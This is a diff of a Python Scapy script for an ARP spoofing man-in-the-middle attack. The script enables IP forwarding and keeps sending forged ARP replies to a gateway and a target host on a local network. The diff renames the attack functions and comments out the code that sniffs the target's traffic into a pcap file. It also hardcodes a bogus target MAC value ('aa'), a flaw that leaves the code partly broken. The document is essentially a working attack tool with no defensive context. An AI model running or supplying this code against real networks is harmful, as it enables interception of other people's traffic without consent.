@@ -8,8 +8,8 @@ import time
 
 #ARP Poison parameters
 gateway_ip = '192.168.2.1'
-target_ip = '192.168.2.119'
-packet_count = 100000
+target_ip = '192.168.2.100'
+#packet_count = 100000
 conf.iface = 'en0'
 conf.verb = 0
 
@@ -37,19 +37,19 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
 
 #Keep sending false ARP replies to put our machine in the middle to intercept packets
 #This will use our interface MAC address as the hwsrc for the ARP reply
-def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
-    print('[*] Started ARP poison attack [CTRL-C to stop]')
+def arp_spoof(gateway_ip, gateway_mac, target_ip, target_mac):
+    print('[*] Started ARP spoofing attack [CTRL-C to stop]')
     try:
         while True:
             send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
             send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
             time.sleep(2)
     except KeyboardInterrupt:
-        print('[*] Stopped ARP poison attack. Restoring network')
+        print('[*] Stopped ARP spoofing attack. Restoring network')
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
 #Start the script
-print('[*] Starting script: arp_poison.py')
+print('[*] Starting script: arp_spoof.py')
 print('[*] Enabling IP forwarding')
 #Enable IP Forwarding on a mac
 os.system('sysctl -w net.inet.ip.forwarding=1')
@@ -63,26 +63,36 @@ if gateway_mac is None:
 else:
     print('[*] Gateway MAC address: ' + gateway_mac)
 
-target_mac = get_mac(target_ip)
+#target_mac = get_mac(target_ip)
+target_mac = 'aa'
 if target_mac is None:
     print('[!] Unable to get target MAC address. Exiting..')
     sys.exit(0)
 else:
     print('[*] Target MAC address: ' + target_mac)
 
-#ARP poison thread
-poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
-poison_thread.start()
-
-#Sniff traffic and write to file. Capture is filtered on target machine
+#ARP spoofing thread
 try:
-    sniff_filter = 'ip host ' + target_ip
-    print('[*] Starting network capture. Packet Count: ' + str(packet_count) + '. Filter: ' + sniff_filter)
-    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
-    wrpcap(target_ip + '_capture.pcap', packets)
-    print('[*] Stopping network capture..Restoring network')
-    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+    spoof_thread = threading.Thread(target=arp_spoof, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+    spoof_thread.daemon = True
+    spoof_thread.start()
+    print('Start arp spoofing')
+    while True: time.sleep(10)
+
 except KeyboardInterrupt:
-    print('[*] Stopping network capture..Restoring network')
+    print('\n[*] Stopping network capture..Restoring network')
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
+
+#Sniff traffic and write to file. Capture is filtered on target machine
+# try:
+#     sniff_filter = 'ip host ' + target_ip
+#     print('[*] Starting network capture. Packet Count: ' + str(packet_count) + '. Filter: ' + sniff_filter)
+#     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
+#     wrpcap(target_ip + '_capture.pcap', packets)
+#     print('[*] Stopping network capture..Restoring network')
+#     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+# except KeyboardInterrupt:
+#     print('[*] Stopping network capture..Restoring network')
+#     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+#     sys.exit(0)
